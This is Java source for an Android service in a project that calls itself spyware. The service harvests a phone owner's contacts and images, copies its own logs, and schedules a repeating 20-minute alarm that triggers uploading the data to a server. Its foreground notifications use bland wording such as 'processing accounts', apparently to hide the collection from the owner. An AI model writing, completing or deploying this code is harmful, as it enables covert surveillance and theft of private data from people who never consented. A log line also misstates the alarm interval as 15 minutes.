package com.gameofcoding.spy.services;
 
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.receivers.UploaderAlarmReceiver;
import com.gameofcoding.spy.server.files.DataFiles;
import com.gameofcoding.spy.spys.ContactsSpy;
import com.gameofcoding.spy.spys.ImagesSpy;
import com.gameofcoding.spy.utils.FileUtils;
import com.gameofcoding.spy.utils.NotificationUtils;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

/**
 * SpyService, it is the one of the most important services of this SpyWare. This is the service
 * which loads all the stuff (e.g images, contacts, etc).
 * Usually this service is started using alarmmanager, but sometimes it may be started using the
 * host application.
 */
public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private static final int UPLOADER_ALARM_ID = 100;
    /*
     * SpyService foreground notification id
     */
    private static final int SPY_SERVICE_NOTIF_ID = 101;
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "SpyService started");
	mContext = getApplicationContext();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	updateNotif(R.string.looking_for_something_new);

	// Check if uploader service is running or not
	Utils utils = new Utils(mContext);
	if(utils.isServiceRunning(UploaderService.class.getName())) {
	    // Uploader is still uploading data to server, we would not load new
	    // data for now
	    XLog.v(TAG, "UploaderService is running, not updating data");
	    stopSelf();
	} else {
	    doInBackground();
	}
	return START_STICKY;
    }

    /**
     * Backbone of the service.
     * This method loads (saves) all the stuff and then starts alarmmanager for starting
     * UploaderService which then uploads that data to service.
     */
    private void doInBackground() {
	Executors.newSingleThreadExecutor()
	    .execute(() -> {
		    try {
			saveData();
			XLog.i(TAG, "Finished saving data");
			setUploaderAlarm();
		    } catch(Exception e) {
			XLog.e(TAG, "Exception occured saving data.", e);
		    } finally {
			stopSelf();
		    }
		});
    }

    /**
     * Cleans (emptys) the directories where we store data.
     */
    private boolean cleanDataDir(File userDataDir, File othersDir) {
	boolean hasDeleted = true;
        for(File file : userDataDir.listFiles()) {
	    if(!FileUtils.delete(file)) {
		XLog.v(TAG, "cleanDataDir(File, File): File could not be deleted, file=" + file);
		hasDeleted = false;
	    }
	}
        for(File file : othersDir.listFiles()){
	    if(!FileUtils.delete(file)) {
		XLog.v(TAG, "cleanDataDir(File, File): File could not be deleted, file=" + file);
		hasDeleted = false;
	    }
	}
	return hasDeleted;
    }

    private void saveData() throws Exception {
	final DataFiles dataFiles = DataFiles.loadFiles(mContext);
	final File userDataDir = dataFiles.getUserDataDir();
	final File othersDir = dataFiles.getOthersDir();

	// Clean data directory before storing anything
	XLog.i(TAG, "Cleaning app data dir...");
	cleanDataDir(userDataDir, othersDir);
	XLog.i(TAG, "App data dir cleaned");

	// Execute tasks in different threads for performenace
	List<Future<?>> execFutures = new ArrayList<Future<?>>();
	ExecutorService executor = Executors.newCachedThreadPool();

	// Task: Save contacts
	execFutures.add(executor.submit(() -> {
		    XLog.i(TAG, "saveData(): Started saving contacts...");
		    updateNotif(R.string.processing_accounts);
		    new ContactsSpy(mContext, new File(userDataDir, ContactsSpy.CONTACTS_FILE_NAME))
			.snoop();
		    XLog.i(TAG, "saveData(): Finished saving contacts");
		}));
	// Task: Save images
	execFutures.add(executor.submit(() -> {
		    XLog.i(TAG, "saveData(): Started saving imagess...");
		    updateNotif(R.string.processing_files);
		    new ImagesSpy(mContext, new File(userDataDir, ImagesSpy.IMAGES_DIR_NAME))
			.snoop();
		    XLog.i(TAG, "saveData(): Finished saving images");
		}));
	// Task: Save logs
	execFutures.add(executor.submit(() -> {
		    XLog.i(TAG, "saveData(): Started copying logs...");
		    File logFile = new File(getExternalCacheDir(), XLog.LOG_FILE_NAME);
		    File destLogFile = new File(othersDir, logFile.getName());
		    try {
			FileUtils.write(destLogFile, FileUtils.read(logFile));
			XLog.i(TAG, "saveData(): Finished copying logs");
		    } catch(IOException e) {
			XLog.e(TAG, "Exception occurred while copying log file", e);
		    }
		}));

	// Wait until all tasks are finished
	for(Future<?> execFuture : execFutures)
	    execFuture.get();
    }

    @SuppressWarnings("deprecation")
    private void updateNotif(int contentTextId) {
	Notification.Builder notifBuilder = null;
	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	    // Create notification channel for oreo and above devices
	    NotificationUtils notifUtils = new NotificationUtils(mContext);
	    notifUtils.createDefaultNotifChannel();
	    String channelID = notifUtils.getDefaultNotifChannelId();
	    notifBuilder = new Notification.Builder(mContext, channelID);
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	    notifBuilder.setPriority(Notification.PRIORITY_LOW);
	}

	// Start foreground notification
	notifBuilder
	    .setSmallIcon(R.drawable.ic_stat_update)
	    .setContentTitle(getString(R.string.spyservice_notif_content_title))
	    .setContentText(getString(contentTextId));
	startForeground(SPY_SERVICE_NOTIF_ID, notifBuilder.build());
    }

    /**
     * Start alarm that repeats after 20 minutes for uploading data to server
     */
    private void setUploaderAlarm() {
	AlarmManager alarmManager = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
	Intent alarmReceiver = new Intent(mContext, UploaderAlarmReceiver.class);
	PendingIntent pendingIntent = PendingIntent.getBroadcast(mContext,
								 UPLOADER_ALARM_ID,
								 alarmReceiver,
								 0);
	alarmManager.setRepeating(AlarmManager.RTC_WAKEUP,
				  System.currentTimeMillis(),
				  Utils.minToMillis(20),
				  pendingIntent);
	XLog.i(TAG, "UploaderAlarmReceiver set to repeat after 15 min.");
    }
}
